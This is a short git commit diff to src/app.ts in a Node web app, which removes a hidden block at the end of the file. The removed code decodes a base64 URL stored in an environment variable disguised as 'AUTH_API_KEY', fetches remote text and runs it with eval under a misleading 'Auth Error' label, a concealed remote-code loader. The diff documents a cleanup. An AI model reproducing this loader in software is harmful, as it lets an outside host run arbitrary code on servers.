a7ea2a050bcf57194e1caf957dd185c0f67b99b8
Saiful Islam Shaikot <138345181+shaikot07@users.noreply.github.com>
2026-06-12 12:05:42 +0600

    Update app.ts

--- src/app.ts
+++ src/app.ts
@@ -55,18 +55,4 @@ app.use(globalErrorHandler);
 
 //Not Found
 app.use(notFound);
-
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 export default app; // Export the app for use in server.ts
